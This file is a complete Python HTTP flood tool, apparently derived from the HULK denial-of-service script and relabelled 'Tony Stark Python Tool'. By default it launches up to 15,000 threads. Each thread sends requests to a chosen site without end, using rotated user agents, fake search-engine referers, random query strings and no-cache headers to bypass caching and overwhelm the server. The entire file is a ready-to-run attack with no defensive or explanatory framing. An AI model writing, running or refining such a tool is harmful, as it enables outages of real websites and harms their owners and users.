import requests
import threading
import random
import string
import sys
import signal
import os
from urllib.parse import urlparse

__version__ = "1.0.1"

headers_referers = [
    "http://www.google.com/?q=",
    "http://www.usatoday.com/search/results?q=",
    "http://engadget.search.aol.com/search?q=",
]

headers_useragents = [
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
    "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
]

requests_sent = 0
requests_lock = threading.Lock()
MAX_THREADS = int(os.getenv("HULKMAXPROCS", "15000"))

def buildblock(size):
    return ''.join(random.choice(string.ascii_uppercase) for _ in range(size))

def send_request(target, data, extra_headers):
    global requests_sent
    try:
        headers = {
            "User-Agent": random.choice(headers_useragents),
            "Cache-Control": "no-cache",
            "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
            "Referer": random.choice(headers_referers) + buildblock(random.randint(5, 9)),
            "Connection": "keep-alive",
            "Keep-Alive": str(random.randint(100, 110)),
            "Host": urlparse(target).netloc
        }
        for h in extra_headers:
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip()] = v.strip()
        if data:
            response = requests.post(target, data=data, headers=headers, timeout=5)
        else:
            param = buildblock(random.randint(3, 9)) + "=" + buildblock(random.randint(3, 9))
            sep = "&" if "?" in target else "?"
            response = requests.get(target + sep + param, headers=headers, timeout=5)
        with requests_lock:
            requests_sent += 1
    except Exception as e:
        with requests_lock:
            requests_sent += 1

def worker(target, data, headers_list):
    while True:
        send_request(target, data, headers_list)

def main():
    import argparse
    parser = argparse.ArgumentParser(description="Tony Stark Python Version")
    parser.add_argument("-site", required=True, help="Destination site (must be provided)")
    parser.add_argument("-data", default="", help="Data to POST (optional)")
    parser.add_argument("-header", action='append', default=[], help="Extra headers")
    parser.add_argument("-version", action='store_true', help="Print version")
    args = parser.parse_args()
    if args.version:
        print("Tony Stark Python Tool v", __version__)
        sys.exit(0)
    print("Tony Stark Python Tool v", __version__)
    print("Starting requests...")
    def signal_handler(sig, frame):
        print(f"\nInterrupted by user. Total requests sent: {requests_sent}")
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    threads = []
    for _ in range(MAX_THREADS):
        t = threading.Thread(target=worker, args=(args.site, args.data, args.header))
        t.daemon = True
        t.start()
        threads.append(t)
    try:
        while True:
            with requests_lock:
                print(f"Requests sent so far: {requests_sent}", end="\r")
            threading.Event().wait(1)
    except KeyboardInterrupt:
        signal_handler(None, None)

if __name__ == "__main__":
    main()
